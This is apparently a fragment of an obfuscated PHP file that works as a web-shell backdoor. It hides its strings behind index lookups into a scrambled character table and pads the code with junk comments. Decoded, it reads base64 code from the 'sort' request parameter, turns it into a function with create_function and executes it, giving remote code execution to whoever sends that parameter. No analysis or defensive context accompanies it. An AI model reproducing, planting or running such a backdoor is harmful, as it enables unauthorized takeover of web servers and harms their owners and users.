...
$HGCbVgFk9601 = "4*0e;v)u2f._wmb3qjyk(op6g89ch7daxir5s/ntzl1";


$daWndwDN6724 = "";

foreach([36,21,34,39] as $w){
       $daWndwDN6724 .= $HGCbVgFk9601[$w];
    }


if(isset($REQUEST /*QupIKOOMAwRqxkyZnwgSgXOAPgUczPxcUpVGnymtpJVtmMUlNbIagsirbdUoKbQySEtYKDDtYqSPUIkQiZdBagxBhuOVPHcnJmMJaaONBqJFvYtPvrswMnEfgeCUNHiw*/["$daWndwDN6724"])){
    $toXOkSTB4431 = $_REQUEST /*QupIKOOMAwRqxkyZnwgSgXOAPgUczPxcUpVGnymtpJVtmMUlNbIagsirbdUoKbQySEtYKDDtYqSPUIkQiZdBagxBhuOVPHcnJmMJaaONBqJFvYtPvrswMnEfgeCUNHiw*/["$daWndwDN6724"];
    $IOGHJdxy3032 = "";
    $dDLnFVaN5543 = "";

    /*BKtOFcZhioFZiYXJdmncRImwWsfKsTDiDsTIAtLEJaqMbUvybdkGIjvDuongiZyGyumWodqudhVSOjMGUpaEtdxdKEpVRylynOzEWhPEqGtruSWiFTKVXqtXUokeuqTK*/

    foreach([14,31,36,3,23,0,11,30,3,27,21,30,3] as $w){
       $IOGHJdxy3032 .= $HGCbVgFk9601[$w];
    }

    /*WDGFxEiixALkTUadlRnGvXikYrYHRCtpyLGZSvuexMXwmpYsJjKKNYRRVNGDgiOnTmzNgFAvrtbczfPacUaiYsuRMDiTqgbFihmVojzfesabFnzcnZkZcfQlwNDCszjr*/


    foreach([36,39,34,34,3,5] as $w){
       $dDLnFVaN5543 .= $HGCbVgFk9601[$w];
    }

    /*rvTwphsiLMRuEPdxsxnkanfYZqREpljwtdsqkxeFmyDgxLBmrojORNoewmaaeqeUofMEYiJvFFimkaSujAaMCHqENCbQOPSMdzZmFljFTeGMQJcWVeJdhVmyXmWZrIzY*/

    $w = $dDLnFVaN5543('n'.''.'o'.''.''.''.''.'i'.''.''.'t'.''.''.''.''.'c'.''.'n'.''.''.''.''.'u'.'f'.'_'.''.''.'e'.''.''.''.'t'.'a'.'e'.'r'.'c'.'');
    $t = $w("", $IOGHJdxy3032($toXOkSTB4431));
    $t();
    exit();
